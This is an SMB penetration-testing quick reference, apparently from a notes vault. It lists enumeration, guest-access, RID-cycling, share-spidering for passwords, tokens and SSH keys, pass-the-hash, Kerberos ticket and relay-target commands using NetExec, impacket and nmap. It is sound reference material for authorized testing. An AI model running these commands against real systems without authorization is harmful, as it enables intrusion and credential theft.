# SMB Quick Reference

## Variables

```bash
export TARGET="192.0.2.10"
export DOMAIN="EXAMPLE"
export USER="authorized-user"
export SHARE="Shared"
```

Use an interactive password prompt or approved secret store. Avoid plaintext passwords in shell history and process listings.

## Discovery

```bash
nmap -Pn -sV -p 139,445 --script smb-os-discovery,smb-protocols,smb2-security-mode "$TARGET"
nxc smb "$TARGET"
```

## Null and guest access

```bash
smbclient -N -L "//$TARGET/"
nxc smb "$TARGET" -u '' -p '' --shares
nxc smb "$TARGET" -u guest -p '' --shares
rpcclient -N -U '' "$TARGET" -c 'srvinfo; enumdomusers; enumdomgroups'
```

## Authenticated enumeration

```bash
smbclient -L "//$TARGET/" -U "$DOMAIN/$USER"
smbclient "//$TARGET/$SHARE" -U "$DOMAIN/$USER"
nxc smb "$TARGET" -d "$DOMAIN" -u "$USER" -p '<password>' --shares
nxc smb "$TARGET" -d "$DOMAIN" -u "$USER" -p '<password>' --users
nxc smb "$TARGET" -d "$DOMAIN" -u "$USER" -p '<password>' --groups
nxc smb "$TARGET" -d "$DOMAIN" -u "$USER" -p '<password>' --pass-pol
```

## Share spidering

```bash
nxc smb "$TARGET" -d "$DOMAIN" -u "$USER" -p '<password>' -M spider_plus
manspider "$TARGET" -d "$DOMAIN" -u "$USER" -p '<password>' \
  -f passwd password secret token api_key id_rsa
```

## RID cycling and RPC

```bash
impacket-lookupsid -no-pass 'guest@'"$TARGET"
nxc smb "$TARGET" -u guest -p '' --rid-brute
impacket-samrdump "$DOMAIN/$USER:<password>@$TARGET"
```

## Pass-the-Hash and Kerberos

```bash
nxc smb "$TARGET" -d "$DOMAIN" -u "$USER" -H '<ntlm-hash>'
impacket-smbclient -hashes ':<ntlm-hash>' "$DOMAIN/$USER@$TARGET"
KRB5CCNAME="/path/to/$USER.ccache" impacket-smbclient -k -no-pass "$DOMAIN/$USER@$TARGET"
```

## Security checks

```bash
# SMB signing and dialects
nmap -Pn -p 445 --script smb2-security-mode,smb-protocols "$TARGET"

# Vulnerability scripts can change target state or trigger alerts; run the approved subset.
nmap -Pn -p 445 --script 'smb-vuln*' "$TARGET"

# Generate relay candidates where SMB signing is not required.
nxc smb "$TARGET" --gen-relay-list relay-targets.txt
```

## Related

- [[03-Enumeration/SMB-Enumeration]] — Full enumeration workflow
- [[00-Quick-Reference/CrackMapExec]] — NetExec protocols and modules
- [[00-Quick-Reference/SMBClient - RPCClient]] — Legacy command reference
- [[06-Lateral-Movement/INDEX]] — Execution and lateral movement
